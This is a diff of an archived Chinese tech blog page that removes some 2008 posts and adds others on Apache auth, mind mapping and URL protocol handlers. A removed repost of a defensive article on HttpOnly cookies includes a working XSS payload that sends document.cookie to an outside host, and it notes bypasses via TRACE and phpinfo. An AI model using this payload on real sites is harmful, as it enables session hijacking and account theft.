@@ -57,155 +57,6 @@
         <!-- new article -->
         <div class="card blog-card">
           <article class="card-body">
-            <a href="/nu/377"  rel="bookmark" >
-              <h2 class="card-title">微软开始发猛了，IIS性能强过Apache</h2>
-            </a>
-            <p class="card-text"><p>看到<a href="https://groups.google.com/group/python-cn/browse_thread/thread/889e26de6a4a8e71">一个帖子</a>，囧了</p>
-<blockquote><p>apache或许在静态文件处理上比不过lighttpd，但是不会到连iis都不如的地步。<br />所谓iis胜过apache，可能是指文件传输的速度iis比apache要好，那是因为iis用了特定的平台api(TransmitFile)，使<br />用了文件系统级的缓存(ntfs.sys)。 </p><p>IIS确实强过Apache，并不是因为使用了什么特别的api，或者文件系统缓存的原因（想想那个文件系统没有缓存功能？服务器拥有的带宽通常都比不过硬盘的­读取速度），关键是它从IIS 6.0开始HTTP连接就是用系统驱动在<br />内核层处理了，所以性能是惊人的，大概只有Linux的内核级的http服务器kHTTPd可以和它比一比。win2008的IIS 7.0更是因为MS重写了整个TCP/IP栈，性能比IIS 6又有了近50%的提升。 </p></blockquote>
-<p>微软的winsock被很多牛人诟病之后，微软开始发猛做 WinINET 和 驱动级的 http 协议栈 http.sys，看来IIS还真的要在服务器市场有所作为啊</p>
-<p>ps Win2008重写了TCP/IP协议栈，我咋没感觉出来喃？</p></p>
-            <div class="card-subtext muted-text">
-              <p>Posted <time datetime="2008-04-02T21:22:01+08:00">2008-04-02</time></p>
-<p>archive</p>            </div>
-          </article>
-        </div>
-
-
-        <!-- new article -->
-        <div class="card blog-card">
-          <article class="card-body">
-            <a href="/yo2/625610"  rel="bookmark" >
-              <h2 class="card-title">[转贴][XSS]利用httponly提升应用程序安全性</h2>
-            </a>
-            <p class="card-text"><p><a href="https://groups.google.com/group/ph4nt0m/">ph4nt0m</a>社区出<a href="https://groups.google.com/group/ph4nt0m/browse_thread/thread/de88b9a7472fa5b4/">webzine</a>了，顶啊！</p>
-<p>转一篇好文章，<a href="https://groups.google.com/group/ph4nt0m/browse_thread/thread/138221cb9405ac1e">利用httponly提升应用程序安全性</a></p>
-<p>&nbsp;==Ph4nt0m Security Team==</p>
-<p>Issue 0×01, Phile #0×06 of 0×06</p>
-<p>|=—————————————————————————=|<br>
-|=————-=[ 利用httponly提升应用程序安全性 ]=————–=|<br>
-|=—————————————————————————=|<br>
-|=—————————————————————————=|<br>
-|=——————–=[ By 剑心 ]=——————–=|<br>
-|=——————–=[ &lt;root_at_ph4nt0m_dot_org&gt; ]=——————–=|<br>
-|=—————————————————————————=|<br>
-|=—————————————————————————=|</p>
-<p>随着www服务的兴起，越来越多的应用程序转向了B/S结构，这样只需要一个浏览器就可<br>
-以访问各种各样的web服务，但是这样也越来越导致了越来越多的web安全问题。www服务依<br>
-赖于Htpp协议实现，Http是无状态的协议，所以为了在各个会话之间传递信息，就不可避免地<br>
-用到Cookie或者Session等技术来标记访问者的状态，而无论是Cookie还是Session，一般都<br>
-是利用Cookie来实现的（Session其实是在浏览器的Cookie里带了一个Token来标记，服务器<br>
-取得了这个Token并且检查合法性之后就把服务器上存储的对应的状态和浏览器绑定），这样<br>
-就不可避免地安全聚焦到了Cookie上面，只要获得这个Cookie，就可以取得别人的身份，这对<br>
-于入侵者是一件很美妙的事情，特别当获得的Cookie属于管理员等高权限身份者时，危害就<br>
-更大了。在各种web安全问题里，其中xss漏洞就因此显得格外危险。</p>
-<p>对于应用程序来说，一旦存在了xss漏洞就意味着别人可以在你的浏览器中执行任意的<br>
-js脚本，如果应用程序是开源的或者功能是公开的话，别人就可以利用ajax使用这些功能，但<br>
-是过程往往很烦琐，特别是想直接获得别人身份做随意浏览的话困难就更大。而对于不开源<br>
-的应用程序，譬如某些大型站点的web后台（web2.0一个显著的特征就是大量的交互，用户往<br>
-往需要跟后台的管理员交互，譬如Bug汇报，或者信息投递等等），尽管因为交互的存在可能存<br>
-在跨站脚本漏洞，但是因为对后台的不了解，无法构造完美的ajax代码来利用，即使可以用js<br>
-取得后台的代码并回传分析，但是过程同样烦琐而且不隐蔽。这个时候，利用xss漏洞获得<br>
-Cookie或者Session劫持就很有效了，具体分析应用程序的认证，然后使用某些技巧，甚至可<br>
-以即使对方退出程序也一样永久性获得对方的身份。</p>
-<p>那么如何获得Cookie或者Session劫持呢？在浏览器中的document对象中，就储存了<br>
-Cookie的信息，而利用js可以把这里面的Cookie给取出来，只要得到这个Cookie就可以拥有<br>
-别人的身份了。一个很典型的xss攻击语句如下：</p>
-<p>xss exp:</p>
-<p>url=document.top.location.href;<br>
-cookie=document.cookie;<br>
-c=new Image();<br>
-c.src="http://www.loveshell.net/c.php?c="+cookie+"&amp;u="+url;</p>
-<p>一些应用程序考虑到这个问题所在，所以可能会采取浏览器绑定技术，譬如将Cookie和浏览<br>
-器的User-agent绑定，一旦发现修改就认为Cookie失效。这种方法已经证明是无效的，因为<br>
-当入侵者偷得Cookie的同时他肯定已经同时获得了User-agent。还有另外一种比较严格的<br>
-是将Cookie和Remote-addr相绑定（其实就是和IP绑定，但是一些程序取得IP的方法有问题一<br>
-样导致饶过），但是这样就带来很差的用户体验，更换Ip是经常的事，譬如上班与家里就是2个<br>
-IP，所以这种方法往往也不给予采用。所以基于Cookie的攻击方式现在就非常流行，在一些<br>
-web 2.0站点很容易就取到应用程序的管理员身份。</p>
-<p>如何保障我们的敏感Cookie安全呢？通过上面的分析，一般的Cookie都是从document对<br>
-象中获得的，我们只要让敏感Cookie在浏览器document中不可见就行了。很幸运，现在浏览<br>
-器在设置Cookie的时候一般都接受一个叫做HttpOnly的参数，跟domain等其他参数一样，一<br>
-旦这个HttpOnly被设置，你在浏览器的document对象中就看不到Cookie了，而浏览器在浏览<br>
-的时候不受任何影响，因为Cookie会被放在浏览器头中发送出去（包括ajax的时候），应用程<br>
-序也一般不会在js里操作这些敏感Cookie的，对于一些敏感的Cookie我们采用HttpOnly，对<br>
-于一些需要在应用程序中用js操作的cookie我们就不予设置，这样就保障了Cookie信息的安<br>
-全也保证了应用。关于HttpOnly说明可以参照<br>
-http://msdn2.microsoft.com/en-us/library/ms533046.aspx。</p>
-<p>给浏览器设置Cookie的头如下：</p>
-<p>Set-Cookie: &lt;name&gt;=&lt;value&gt;[; &lt;name&gt;=&lt;value&gt;]<br>
-[; expires=&lt;date&gt;][; domain=&lt;domain_name&gt;]<br>
-[; path=&lt;some_path&gt;][; secure][; HttpOnly]</p>
-<p>以php为例，在php 5.2版本时就已经在Setcookie函数加入了对HttpOnly的支持，譬如</p>
-<p>&lt;?php</p>
-<p>setcookie("abc", "test", NULL, NULL, NULL, NULL, TRUE);</p>
-<p>?&gt;</p>
-<p>就可以设置abc这个cookie，将其设置为HttpOnly，document将不可见这个Cookie。因为<br>
-setcookie函数本质就是个header，所以一样可以使用header来设置HttpOnly。然后再使用<br>
-document.cookie就可以看到已经取不到这个Cookie了。我们用这种方法来保护利例如<br>
-Sessionid，如一些用于认证的auth-cookie，就不用担心身份被人获得了，这对于一些后台程<br>
-序和webmail提升安全性的意义是重大的。再次使用上面的攻击手法时可以看到，已经不能<br>
-获取被我们设置为HttpOnly的敏感Cookie了。</p>
-<p>但是，也可以看到HttpOnly并不是万能的，首先它并不能解决xss的问题，仍然不能抵制<br>
-一些有耐心的黑客的攻击，也不能防止入侵者做ajax提交，甚至一些基于xss的proxy也出现<br>
-了，但是已经可以提高攻击的门槛了，起码xss攻击不是每个脚本小子都能完成的了，而且其<br>
-他的那些攻击手法因为一些环境和技术的限制，并不像Cookie窃取这种手法一样通用。</p>
-<p>HttpOnly也是可能利用一些漏洞或者配置Bypass的，关键问题是只要能取到浏览器发送<br>
-的Cookie头就可以了。譬如以前出现的Http Trace攻击就可以将你的Header里的Cookie回<br>
-显出来，利用ajax或者flash就可以完成这种攻击，这种手法也已经在ajax和flash中获得修<br>
-补。另外一个关于配置或者应用程序上可能Bypass的显著例子就是phpinfo，大家知道<br>
-phpinfo会将浏览器发送的http头回显出来，其中就包括我们保护的auth信息，而这个页面经<br>
-常存在在各种站点上，只要用ajax取phpinfo页面，取出header头对应的部分就可以获得<br>
-Cookie了。一些应用程序的不完善也可能导致header头的泄露，这种攻击方式对于basic验<br>
-证保护的页面一样可以攻击。</p>
-<p>HttpOnly在IE 6以上，Firefox较新版本都得到了比较好的支持，并且在如Hotmail等应<br>
-用程序里都有广泛的使用，并且已经是取得了比较好的安全效果。</p>
-<p>-EOF-</p></p>
-            <div class="card-subtext muted-text">
-              <p>Posted <time datetime="2008-03-26T00:54:38+08:00">2008-03-26</time></p>
-<p>archive</p>            </div>
-          </article>
-        </div>
-
-
-        <!-- new article -->
-        <div class="card blog-card">
-          <article class="card-body">
-            <a href="/yo2/625596"  rel="bookmark" >
-              <h2 class="card-title">杯葛notepad++！</h2>
-            </a>
-            <p class="card-text"><p>notepad++ 是一个开源的文本编辑工具 <a href="http://notepad-plus.sourceforge.net/">http://notepad-plus.sourceforge.net/</a>，功能就不用说了，今天看到<a href="http://groups.google.com/group/python-cn/browse_thread/thread/69c128c70cb9c353">一件令人气氛的事情</a>，估计最近作者脑袋被门夹了，在sf首页写着B‌o‌y‌c‌o‌t‌t‌ ‌B‌eijing ‌2‌0‌0‌8‌，大家转用<a href="http://www.pspad.com/">PSPad</a>、<a href="http://sourceforge.net/projects/notepad2">notepad2</a>、<a href="http://www.emeditor.com/">EmEditor</a>等软件吧</p>
-<p>作者的邮箱是<a href="mailto:don.h@free.fr">don.h@free.fr</a>，大家看着办吧，当然也可以到notepad++的<a href="http://sourceforge.net/forum/?group_id=95717">论坛</a>里留一句言：notepad++ sucks!</p>
-<p>vim 声明帮助乌干达难民<br>
-而 notepad++ 在声明抵制一个体育赛事</p>
-<p><img src='http://image.cache.yo2blog.com/wp-content/uploads/74/7487/2008/03/12.jpg' alt='12.jpg' width="600" height="327"></p></p>
-            <div class="card-subtext muted-text">
-              <p>Posted <time datetime="2008-03-25T18:38:23+08:00">2008-03-25</time></p>
-<p>archive</p>            </div>
-          </article>
-        </div>
-
-
-        <!-- new article -->
-        <div class="card blog-card">
-          <article class="card-body">
-            <a href="/yo2/625525"  rel="bookmark" >
-              <h2 class="card-title">不同的字符，一样的MD5</h2>
-            </a>
-            <p class="card-text"><div style="width:500px;word-wrap:break-word;">d131dd02c5e6eec4693d9a0698aff95c2fcab5<span style="color:red">0</span>712467eab4004583eb8fb7f8955ad340609f4b30283e4888325<span style="color:red">f</span>1415a085125e8f7cdc99fd91dbd<span style="color:red">7</span>280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080<span style="color:red">2</span>80d1ec69821bcb6a8839396f965<span style="color:red">a</span>b6ff72a70
-<p>d131dd02c5e6eec4693d9a0698aff95c2fcab5<span style="color:red">8</span>712467eab4004583eb8fb7f8955ad340609f4b30283e4888325<span style="color:red">7</span>1415a085125e8f7cdc99fd91dbd<span style="color:red">f</span>280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080<span style="color:red">a</span>80d1ec69821bcb6a8839396f965<span style="color:red">2</span>b6ff72a70</p>
-</div>
-<p>两个字符的MD5都是 edde4181249fea68547c2fd0edd2e22f</p>
-<p>来源：<a href="http://www.mathstat.dal.ca/~selinger/md5collision/">http://www.mathstat.dal.ca/~selinger/md5collision/</a></p></p>
-            <div class="card-subtext muted-text">
-              <p>Posted <time datetime="2008-03-24T00:27:23+08:00">2008-03-24</time></p>
-<p>archive</p>            </div>
-          </article>
-        </div>
-
-
-        <!-- new article -->
-        <div class="card blog-card">
-          <article class="card-body">
             <a href="/yo2/625521"  rel="bookmark" >
               <h2 class="card-title">[javascript]除了alert之外的对话框</h2>
             </a>
@@ -702,35 +553,6 @@ This consists of the following components:</p>
 <p>谢谢大家了 ！</p></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2008-02-19T09:59:06+08:00">2008-02-19</time></p>
-<p>archive</p>            </div>
-          </article>
-        </div>
-
-
-        <!-- new article -->
-        <div class="card blog-card">
-          <article class="card-body">
-            <a href="/yo2/623973"  rel="bookmark" >
-              <h2 class="card-title">Google, Baidu经常抽风</h2>
-            </a>
-            <p class="card-text"><p>您所请求的网址（URL）无法获取</p>
-<p>——————————————————————————–</p>
-<p>当尝试读取以下网址（URL）时： http://www.google.com/search?hl=en&amp;q=Applying+background+to+Iframe+for+IE</p>
-<p>发生了下列的错误：</p>
-<p>无法将您输入的主机名称：www.google.com转换成 IP 地址<br>
-域名服务器返回以下讯息：</p>
-<p>No DNS records<br>
-这表示：</p>
-<p>The cache was not able to resolve the hostname presented in the URL.<br>
-Check if the address is correct.<br>
-缓存服务器无法解析您输入网址（URL）中的主机名称，<br>
-请检查该名称是否正确。</p>
-<p>本缓存服务器管理员：webmaster@fastcdn.com</p>
-<p>——————————————————————————–</p>
-<p>Generated Mon, 18 Feb 2008 09:11:05 GMT by CNC-TJTG-182.229.fastcdn.com (squid)</p>
-<p>2008-2-18 成都教育网，Google.com和Baidu.com经常出现DNS解析错误。不是ZF在搞鬼就是电信技术人员工资没发够。</p></p>
-            <div class="card-subtext muted-text">
-              <p>Posted <time datetime="2008-02-18T17:12:55+08:00">2008-02-18</time></p>
 <p>archive</p>            </div>
           </article>
         </div>
@@ -2865,6 +2687,641 @@ AuthExternal auth_dormid　　　上面设置的 关键词<br>
 require valid-user　　　　　　需要成功认证的用户和密码才能访问页面</p></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2007-12-22T16:41:19+08:00">2007-12-22</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/602267"  rel="bookmark" >
+              <h2 class="card-title">编译mod_auth_mysql不成功，原来官方已经确认bug</h2>
+            </a>
+            <p class="card-text"><p>According to the <a href="http://packages.qa.debian.org/liba/libapache-mod-auth-mysql.html">QA page for libapache-mod-auth-mysql</a>, it was <a href="http://packages.qa.debian.org/liba/libapache-mod-auth-mysql/news/20061022T223912Z.html">removed From&nbsp;etch</a> because of <a href="http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=389579">failed to build From&nbsp;source against apache2.2</a>. You could work around the missing package with libapache2-mod-auth-pam and libpam-mysql</p>
+<p>我个人推荐这个方法，100%成功。<a href="http://ubuntuforums.org/showpost.php?p=1846046&amp;postcount=18">http://ubuntuforums.org/showpost.php?p=1846046&amp;postcount=18</a></p>
+<p>Update1:<br>
+我测试了很久 libapache2-mod-auth-pam，想在apache2整合MySql认证，结果，orz<br>
+<a href="https://answers.launchpad.net/ubuntu/+source/libapache2-mod-auth-pam/+question/10853">https://answers.launchpad.net/ubuntu/+source/libapache2-mod-auth-pam/+question/10853</a></p>
+<blockquote>
+<p>mod_auth_pam is a module that requires access to one's system password file. http://pam.sourceforge.net/mod_auth_pam/ recommends the use of mod_authnz_external as mod_auth_pam is no longer developed/supported</p>
+</blockquote>
+<p>汗啊汗，我辛苦配置了3周的SVN+DAV+Apache2+MySQL认证由光荣的失败喽，现在开始研究 <a href="http://unixpapa.com/mod_auth_external.html">mod_authnz_external</a></p>
+<p>开源路漫漫</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2007-12-21T21:31:55+08:00">2007-12-21</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/598947"  rel="bookmark" >
+              <h2 class="card-title">Google官方的词典机器人，很瓜</h2>
+            </a>
+            <p class="card-text"><p>加<a href="gtalk:chat?jid=zh2en@bot.talk.google.com">zh2en@bot.talk.google.com</a>为好友，可以调用Google的全文翻译。</p>
+<p>摘录一段：</p>
+<blockquote>
+<p>electronixtar: 中文<br>
+zh2en: Chinese<br>
+electronixtar: 哈哈<br>
+zh2en: You<br>
+electronixtar: LOL<br>
+zh2en: LOL<br>
+electronixtar: b4<br>
+zh2en: B4<br>
+electronixtar: 瓜货<br>
+zh2en: Melon goods<br>
+Sent at 4:28 PM on Wednesday</p>
+</blockquote>
+<p>很好很水产～～～</p>
+<p>同理的机器人还有 en2zh@bot.talk.google.com，jp2en@bot.talk.google.com等等</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2007-12-19T16:59:05+08:00">2007-12-19</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/598941"  rel="bookmark" >
+              <h2 class="card-title">MIT的Walter Lewin</h2>
+            </a>
+            <p class="card-text"><p>网上名人啊，地球真小</p>
+<p><a href="http://www.cnbeta.com/articles/45485.htm">http://www.cnbeta.com/articles/45485.htm</a></p>
+<blockquote>
+<p>美国71岁的物理学教授沃尔特H•G•莱温在麻省理工拥有大量“粉丝”,并正在成为国际互联网的领袖,这全是由于他通过网络建立的全球物理课堂.<br>
+莱温教授的物理课录像最初在马萨诸塞州工业大学的网站上免费发布,很快就受到了来自全国喜爱者的追捧.一位印度网友在他发给莱温的邮件中说:“通过你的那些课程录像,我发现原来物理如此美妙,既令人吃惊又简单易学.”</p>
+</blockquote>
+<p>这位老师的主页是<a href="http://web.mit.edu/physics/facultyandstaff/faculty/walter_lewin.html">http://web.mit.edu/physics/facultyandstaff/faculty/walter_lewin.html</a>，还有他在<a href="http://en.wikipedia.org/wiki/Walter_Lewin">wikipedia上</a>的介绍</p>
+<p>顺便贴几段视频</p>
+<p>M.I.T.-Walter Lewin- Complete Breakdown of Intuition - Part1</p>
+<object width="425" height="355"><param name="movie" value="http://www.youtube.com/v/eqjl-qRy71w&amp;rel=1">
+<param name="wmode" value="transparent">
+<p><embed src="http://www.youtube.com/v/eqjl-qRy71w&amp;rel=1" type="application/x-shockwave-flash" wmode="transparent" width="425" height="355"></p>
+</object>
+<p>还是想说，我天朝什么时候才能出现这样的老师啊 -_-!</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2007-12-19T16:53:53+08:00">2007-12-19</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/546571"  rel="bookmark" >
+              <h2 class="card-title">Mind mapping</h2>
+            </a>
+            <p class="card-text"><p>最近尝试了几乎世界上所有的MindMapper软件，发现没有一款适合我。</p>
+<p>可能是我的思维和绝大多数人不一样吧，绝大多数MindMapper软件都是一个中心，引出一点，然后引出另一点，然后另一点……</p>
+<p>我的思维完全不同，先是冒出很多个node，然后通过network把这些node结合起来，有可能一个network变成一个新的node，或者几个node形成loop，甚至二维平面不能表现的loop，只有通过3D来想象……</p>
+<p><img src="http://upload.wikimedia.org/wikipedia/en/4/42/Mindmap.gif" alt="colored mindmap"><br>
+一旦我开始BrainStorming，几乎没有东西能够结构化的记录我思考到的idea，只有通过hand script按照时间顺序记录basic threading line，所以我很多发散性idea都稍纵即逝。</p>
+<p><img src="http://upload.wikimedia.org/wikipedia/commons/7/7f/Guru_Mindmap.jpg" alt="hand drawn mind map"></p>
+<p>或许我不会真正的mind mapping，wikipedia上介绍说，<a href="http://en.wikipedia.org/wiki/Mind_map#Mind_map_guidelines">Mindmapping分以下步骤</a>：</p>
+<ol>
+<li>Start in the center with an image of the topic, using at least 3 colors.</li>
+<li>Use images, symbols, codes, and dimensions throughout your Mind Map.</li>
+<li>Select key words and print using upper or lower case letters.</li>
+<li>Each word/image must be alone and sitting on its own line.</li>
+<li>The lines must be connected, starting From&nbsp;the central image. The central lines are thicker, organic and flowing, becoming thinner as they radiate out From&nbsp;the centre.</li>
+<li>Make the lines the same length as the word/image.</li>
+<li>Use colors – your own code – throughout the Mind Map.</li>
+<li>Develop your own personal style of Mind Mapping.</li>
+<li>Use emphasis and show associations in your Mind Map.</li>
+<li style="list-style: none">
+<div style="margin-left: 2em">
+<p>后来又听说了<a href="http://en.wikipedia.org/wiki/Concept_mapping">Concept Mapping</a>，源于programming的东东，看来只有geeky的东西才适合我啊<br>
+<img src="http://upload.wikimedia.org/wikipedia/en/3/3a/Conceptmap.gif" alt="concept mapping"></p>
+<p>在Concept Mapping中反而有很多我喜欢的概念，summarizing，key concept，relation，hierarchy，source，creation,transform，organize<br>
+等等～～</p>
+<p>我的希望：</p>
+<p>真希望GTD系统，个人海量资料库（如OneNote）、MindMapper，日程日历，语义化tagging能够被一个界面整合到一起……</p>
+<p>思维比较混乱，胡言乱语了一篇blog</p>
+<p>或许，这是碳文明依赖硅文明，生命进化和分化的另一个开端？</p>
+</div>
+</li>
+</ol></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2007-11-21T23:30:54+08:00">2007-11-21</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/543929"  rel="bookmark" >
+              <h2 class="card-title">URLProtocolView 看看你的windows有多少协议被注册了</h2>
+            </a>
+            <p class="card-text"><p>nirsoft出品，必属精品。<a href="http://www.nirsoft.net/utils/url_protocol_view.html">URLProtocolView</a>是nirsoft在2007年推出的一款软件，可以查看Windows内已经注册的<a href="http://msdn2.microsoft.com/en-us/library/Aa767743.aspx">Asynchronous Pluggable Protocols</a>。</p>
+<p><a href="http://www.nirsoft.net/utils/urlprotocolview_u.zip"><img src="http://www.nirsoft.net/utils/urlprotocolview.gif" alt="UrlProtocolView" width="718" height="384"></a></p>
+<blockquote>
+<p>什么是<strong>A</strong>synchronous <strong>P</strong>luggable <strong>P</strong>rotocols（APP）呢？举个例子，网页里点击一个eMule的超链接，<br>
+<a href="ed2k://|file|BBC.Planet.Earth.03of11.Fresh.Water.720p.Divx6.Ac3.avi|2302461952|bd651d4325e14182f101697e18f08391|/">ed2k://|file|BBC.Planet.Earth.03of11.Fresh.Water.720p.Divx6.Ac3.avi|2302461952|bd651d4325e14182f101697e18f08391|/</a><br>
+系统是怎么启动eMule的呢？我们通过注册表可以看到<code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\ed2k\shell\open\command</code>指向<code>"D:\下载工具\eMule\EMULE.EXE" "%1"</code>那么相当于我们在命令行里运行了<code>&gt;"D:\下载工具\eMule\EMULE.EXE" "|file|BBC.Planet.Earth.03of11.Fresh.Water.720p.Divx6.Ac3.avi|2302461952|bd651d4325e14182f101697e18f08391|/"</code>。这就是<strong>APP</strong>。</p>
+</blockquote>
+<p>APP可能导致很多安全隐患，例如几个月前沸沸扬扬的<a href="http://xforce.iss.net/xforce/xfdb/38327">Mozilla URI漏洞</a></p>
+<p>扫描了一下，我的Vista下注册的APP是相当的多啊。</p>
+<pre>
+==================================================
+URL Name          : callto
+Status            : Enabled
+Description       : URL:Callto Protocol
+Command-Line      : "D:\Chat\Skype\Skype.exe" "/callto:"%l""
+Product Name      : Skype
+Company Name      : Skype Technologies S.A.
+================================================== <br>
+==================================================
+URL Name          : coll
+Status            : Enabled
+Description       : URL:Directory Opus File Collection
+Command-Line      : D:\Downloads\DOpusInstall\Disk1\data1\dopusrt.exe /
+dde
+Product Name      : Skype
+Company Name      : Skype Technologies S.A.
+================================================== <br>
+==================================================
+URL Name          : ed2k
+Status            : Enabled
+Description       : URL: ed2k Protocol
+Command-Line      : "D:\下载工具\eMule\EMULE.EXE" "%1"
+Product Name      : eMule
+Company Name      : http://www.emule-project.net
+================================================== <br>
+==================================================
+URL Name          : Explorer.AssocProtocol.search-ms
+Status            : Enabled
+Description       : Windows Search Protocol
+Command-Line      : %SystemRoot%\Explorer.exe /separate,/idlist,%I,%L
+Product Name      : Microsoft? Windows? Operating System
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : file
+Status            : Enabled
+Description       : URL:File Protocol
+Command-Line      : %SystemRoot%\Explorer.exe /separate,/idlist,%I,%L
+Product Name      : Microsoft? Windows? Operating System
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : FirefoxURL
+Status            : Enabled
+Description       : Firefox URL
+Command-Line      : D:\浏览器~1\FIREFOX\FIREFOX.EXE -requestPending -
+osint -url "%1"
+Product Name      : Firefox
+Company Name      : Mozilla Corporation
+================================================== <br>
+==================================================
+URL Name          : ftp
+Status            : Enabled
+Description       : URL:File Transfer Protocol
+Command-Line      : "C:\Program Files\Internet Explorer\iexplore.exe"
+%1
+Product Name      : Windows? Internet Explorer
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : gopher
+Status            : Enabled
+Description       : URL:Gopher Protocol
+Command-Line      : D:\浏览器~1\FIREFOX\FIREFOX.EXE -requestPending -
+osint -url "%1"
+Product Name      : Firefox
+Company Name      : Mozilla Corporation
+================================================== <br>
+==================================================
+URL Name          : gtalk
+Status            : Enabled
+Description       : URL:Gopher Protocol
+Command-Line      : "D:\Chat\Google Talk\googletalk.exe" "/%1"
+Product Name      : Google Talk
+Company Name      : Google
+================================================== <br>
+==================================================
+URL Name          : http
+Status            : Enabled
+Description       : URL:HyperText Transfer Protocol
+Command-Line      : "C:\Program Files\Internet Explorer\iexplore.exe" -
+nohome
+Product Name      : Windows? Internet Explorer
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : https
+Status            : Enabled
+Description       : URL:HyperText Transfer Protocol with Privacy
+Command-Line      : "C:\Program Files\Internet Explorer\iexplore.exe" -
+nohome
+Product Name      : Windows? Internet Explorer
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : IE.FTP
+Status            : Enabled
+Description       : URL:File Transfer Protocol
+Command-Line      : "C:\Program Files\Internet Explorer\iexplore.exe"
+%1
+Product Name      : Windows? Internet Explorer
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : IE.HTTP
+Status            : Enabled
+Description       : URL:HyperText Transfer Protocol
+Command-Line      : "C:\Program Files\Internet Explorer\iexplore.exe" -
+nohome
+Product Name      : Windows? Internet Explorer
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : IE.HTTPS
+Status            : Enabled
+Description       : URL:HyperText Transfer Protocol with Privacy
+Command-Line      : "C:\Program Files\Internet Explorer\iexplore.exe" -
+nohome
+Product Name      : Windows? Internet Explorer
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : IMTo
+Status            : Enabled
+Description       : IMToProtocol
+Command-Line      : "D:\Chat\Tencent\QQ2007\Timwp.exe" "%1"
+Product Name      : QQOneClickApp 应用程序
+Company Name      :
+================================================== <br>
+==================================================
+URL Name          : irc
+Status            : Enabled
+Description       : URL:IRC Protocol
+Command-Line      : "D:\Chat\SysReset\mirc.exe" -noconnect
+Product Name      : mIRC
+Company Name      : mIRC Co. Ltd.
+================================================== <br>
+==================================================
+URL Name          : joost
+Status            : Enabled
+Description       : URL:IRC Protocol
+Command-Line      : "C:\Program Files\Joost\xulrunner\tvprunner.exe"
+"C:\Program Files\Joost\application.ini" "%1"
+Product Name      : Joost
+Company Name      : Joost Technologies B.V.
+================================================== <br>
+==================================================
+URL Name          : lastfm
+Status            : Enabled
+Description       : URL:lastfm
+Command-Line      : "D:\Media\Players\last.fm\LastFM.exe" "%1"
+Product Name      : Last.fm
+Company Name      : Last.fm
+================================================== <br>
+==================================================
+URL Name          : LDAP
+Status            : Enabled
+Description       : URL:LDAP Protocol
+Command-Line      : "%ProgramFiles%\Windows Mail\wab.exe" "/ldap:%1"
+Product Name      : Microsoft? Windows? Operating System
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : mailto
+Status            : Enabled
+Description       : URL:Mail Protocol
+Command-Line      : "d:\chat\google talk\googletalk.exe" /mailto %1
+Product Name      : Google Talk
+Company Name      : Google
+================================================== <br>
+==================================================
+URL Name          : mapi
+Status            : Enabled
+Description       : URL:Mail Protocol
+Command-Line      : "d:\chat\google talk\googletalk.exe" /mailto %1
+Product Name      : Google Talk
+Company Name      : Google
+================================================== <br>
+==================================================
+URL Name          : maze
+Status            : Enabled
+Description       : URL: maze Protocol
+Command-Line      : "D:\下载工具\Maze\Maze,1.exe" "%1"
+Product Name      : Google Talk
+Company Name      : Google
+================================================== <br>
+==================================================
+URL Name          : msdigitallocker
+Status            : Enabled
+Description       : URL:Digital Locker Protocol
+Command-Line      : "%SystemRoot%\DigitalLocker\digitalx.exe" %1
+Product Name      : digital locker assistant
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : news
+Status            : Enabled
+Description       : URL:News Protocol
+Command-Line      : "%ProgramFiles%\Windows Mail\WinMail.exe" /
+newsurl:"%1"
+Product Name      : Microsoft(R) Windows(R) Operating System
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : nntp
+Status            : Enabled
+Description       : URL:NNTP Protocol
+Command-Line      : "%ProgramFiles%\Windows Mail\WinMail.exe" /
+newsurl:"%1"
+Product Name      : Microsoft(R) Windows(R) Operating System
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : OneIndex
+Status            : Enabled
+Description       : Microsoft Office OneNote Protocol Handler for
+Windows Desktop Search
+Command-Line      : "%ProgramFiles%\Windows Mail\WinMail.exe" /
+newsurl:"%1"
+Product Name      : Microsoft(R) Windows(R) Operating System
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : OneNote
+Status            : Enabled
+Description       : URL:OneNote Protocol
+Command-Line      : D:\PROGRA~2\MICROS~2\Office12\ONENOTE.EXE /
+hyperlink "%1"
+Product Name      : Microsoft Office OneNote
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : picasa
+Status            : Enabled
+Description       : Picasa Command protocol
